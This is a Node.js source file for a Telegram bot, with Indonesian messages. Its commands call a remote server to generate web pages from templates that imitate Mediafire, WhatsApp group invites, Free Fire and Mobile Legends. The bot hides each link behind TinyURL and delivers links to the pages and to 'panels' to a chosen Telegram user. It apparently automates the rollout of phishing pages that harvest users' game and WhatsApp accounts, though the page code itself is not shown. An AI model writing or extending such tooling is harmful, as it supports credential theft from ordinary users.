const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Load config
const config = require('./config');
const owner = require('./owner.json');

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Telegram bot
let bot;
let botStatus = 'disconnected';

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connect Telegram bot
function connectBot(token) {
  try {
    if (bot) {
      bot.stopPolling();
    }
    
    bot = new TelegramBot(token, { polling: true });
    botStatus = 'connected';
    
    // Set up bot commands
    setupBotCommands();
    
    return true;
  } catch (error) {
    console.error('Error connecting bot:', error);
    botStatus = 'disconnected';
    return false;
  }
}

// Setup bot commands
function setupBotCommands() {
  // Start command
  bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const menu = `
SIMPEL MENU
/cek_id 
/create_panel <nomorpanel> <idtelegram>
/cwebp <nomorwebp> <idtelegram>
╔════════════════════╗
       *📝 KETERANGAN*  
╚════════════════════╝
*TAMP PANEL JASTEB :*
1.panel biasa
2.panel atur ress
*TAMP WEBP :*
1.Mediafire MP4
2.Mediafire ZIP
3.Grup Wa V1
4.Grup Wa V2
5.Free Fire V1
6.Free Fire V1
7.Mobile Legends V1
8.Mobile Legends V2
9.Naruto Free Fire V1
10.Naruto Free Fire V2

*Contoh Create Panel Jasteb :*
▫️ */createpanel 1 idtelemu*

*Contoh Create Webp :*
▫️ */cwebp 1 idtelemu*

╔════════════════════╗
       *👨‍💻 CREATED BY*  
╚════════════════════╝
▫️ *AldiXDCodeX🇲🇨*
▫️ © Since 2023
    `;
    
    bot.sendMessage(chatId, menu, { parse_mode: 'Markdown' });
  });

  // Check ID command
  bot.onText(/\/cek_id/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `ID Telegram Anda: ${chatId}`);
  });

  // Create Panel command
  bot.onText(/\/create_panel (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const isCreator = owner.owners.includes(chatId.toString());
    
    if (!isCreator) {
      return bot.sendMessage(chatId, "Fitur ini hanya dapat digunakan oleh owner.");
    }

    const args = match[1].split(' ');
    if (args.length < 2) {
      return bot.sendMessage(chatId, `Format salah! Contoh penggunaan: /create_panel <nomorpanel> <idtelegram>`);
    }

    const nomorZIP = args[0];
    const targetId = args[1];

    bot.sendMessage(chatId, "Sedang membuat... Mohon tunggu sebentar dan jangan spam!");

    const inputt = new URLSearchParams();
    inputt.append("nomor", nomorZIP);
    inputt.append("buatweb", true);

    const serverUrl = `https://${config.UrlCreate}/proses.php`;

    try {
      const response = await axios.post(serverUrl, inputt);
      const json = response.data;

      if (json.status === "success") {
        const folderName = json.folder;
        const detailP1 = `*DETAIL PANEL ANDA*\n` +
          `WEB : https://${config.UrlCreate}/${config.FolderPanel}/${folderName}/aldixd\n` +
          `API WEB : https://${config.UrlCreate}/${config.FolderPanel}/${folderName}/apiii.php\n` +
          `*NOTE : API UDH KE KONEK OTOMATIS JADI TINGGAL PAKAI SAJA*`;

        // Kirim detail ke target
        bot.sendMessage(targetId, detailP1, { parse_mode: 'Markdown' });
        bot.sendMessage(chatId, `Panel telah berhasil dikirim ke ID Telegram ${targetId}.`);
      } else {
        bot.sendMessage(chatId, `Terjadi kesalahan: ${json.message}`);
      }
    } catch (error) {
      console.error("Error in request:", error);
      bot.sendMessage(chatId, "Terjadi kesalahan dalam proses pembuatan. Silakan coba lagi.");
    }
  });

  // Create Webp command
  bot.onText(/\/cwebp (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');
    
    if (args.length < 2) {
      return bot.sendMessage(chatId, `Format salah! Contoh penggunaan: /cwebp <nomorwebp> <idtelegram>`);
    }

    const nomorZIP = args[0];
    const targetId = args[1];

    bot.sendMessage(chatId, "Sedang membuat... Mohon tunggu sebentar dan jangan spam!");

    const inputt = new URLSearchParams();
    inputt.append("nomor", nomorZIP);
    inputt.append("trigger_alpha_92", true);
    inputt.append("buatweb", true);

    const serverUrl = `https://${config.UrlWebp}/proses.php`;

    try {
      const response = await axios.post(serverUrl, inputt, {
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
      });

      const json = response.data;

      if (json.status === "success") {
        const folderName = json.folder;
        const webUrl = `https://${config.UrlWebp}/${config.FolderWebp}/${folderName}`;
        const settingUrl = `${webUrl}/setting.php`;

        async function getShortUrl(longUrl) {
          const tinyResponse = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
          return tinyResponse.data;
        }

        const shortWebUrl = await getShortUrl(webUrl);

        const detailP1 = 
`╔═══════════════════════════════
║  *📌 DETAIL WEBP ANDA*  
╠═══════════════════════════════
║  
║  🌐 *WEB ASLI*: ${webUrl}
║  🔗 *WEB SHORT*: ${shortWebUrl}
║  ⚙️ *SETTING WEB*: ${settingUrl}
║  
╠═══════════════════════════════
║  
║  *📝 CATATAN*: 
║  simpan baek baek bos
║  saran ku pakek yg short
║  
╚═══════════════════════════════`;

        bot.sendMessage(targetId, detailP1, { parse_mode: 'Markdown' });
        bot.sendMessage(chatId, `*Success create webp, detail telah dikirim ke ID Telegram* ${targetId}.`, { parse_mode: 'Markdown' });
      } else {
        bot.sendMessage(chatId, `Terjadi kesalahan: ${json.message}`);
      }
    } catch (error) {
      console.error("Error in request:", error.message);
      bot.sendMessage(chatId, "Terjadi kesalahan dalam proses pembuatan. Silakan coba lagi.");
    }
  });
}

// API endpoint to connect bot
app.post('/connect', (req, res) => {
  const { apiKey } = req.body;
  
  if (!apiKey) {
    return res.status(400).json({ success: false, message: 'API key is required' });
  }
  
  const success = connectBot(apiKey);
  
  if (success) {
    res.json({ success: true, message: 'Bot connected successfully', status: botStatus });
  } else {
    res.status(500).json({ success: false, message: 'Failed to connect bot', status: botStatus });
  }
});

// API endpoint to check bot status
app.get('/status', (req, res) => {
  res.json({ status: botStatus });
});

// Serve HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

// Start server (only when not in Vercel environment)
if (process.env.VERCEL !== '1') {
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    if (config.telegramToken) {
      connectBot(config.telegramToken);
    }
  });
}

// Export the app for Vercel
module.exports = app;
